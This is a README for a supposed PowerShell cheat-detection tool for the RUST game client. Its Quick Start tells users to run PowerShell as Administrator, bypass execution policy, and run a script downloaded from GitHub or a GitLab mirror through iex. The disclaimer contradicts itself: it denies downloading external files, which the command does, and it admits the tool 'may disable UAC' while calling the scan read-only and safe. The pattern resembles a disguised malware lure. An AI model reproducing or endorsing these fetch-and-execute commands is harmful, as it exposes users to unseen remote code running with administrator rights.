# 🛡️ Rust Client Quick Integrity Checker

[![PowerShell](https://img.shields.io/badge/PowerShell-5.1+-blue.svg?style=for-the-badge&logo=powershell)](https://docs.microsoft.com/en-us/powershell/)
[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey.svg?style=for-the-badge)](https://www.microsoft.com/windows)
[![Status](https://img.shields.io/badge/Status-Stable-green.svg?style=for-the-badge)]()
[![License](https://img.shields.io/badge/License-MIT-green.svg?style=for-the-badge)](LICENSE)

**A lightweight PowerShell tool for a quick visual scan of your RUST game client – detects potential cheats, macros, and suspicious modifications.**

> ⚠️ **Important:** This tool is intended for **educational and research purposes**. It does **not** guarantee 100% detection and does **not** modify your system, change Windows Defender settings, or download any external files. It **may** disable UAC, . The scan is read‑only and completely safe.

## 🚀 Quick Start (one command – no manual steps)

Run PowerShell **as Administrator**, then copy and paste this single line:

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://raw.githubusercontent.com/AsyncFlow200/Rust-Protection-Suite/refs/heads/main/RustCheatChecker.ps1' -UseBasicParsing).Content
```
If this command doesn't work then try this:
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex (iwr 'https://gitlab.com/femdaun/Rust-Protection-Suite/-/raw/main/RustCheatChecker.ps1?ref_type=heads' -UseBasicParsing).Content
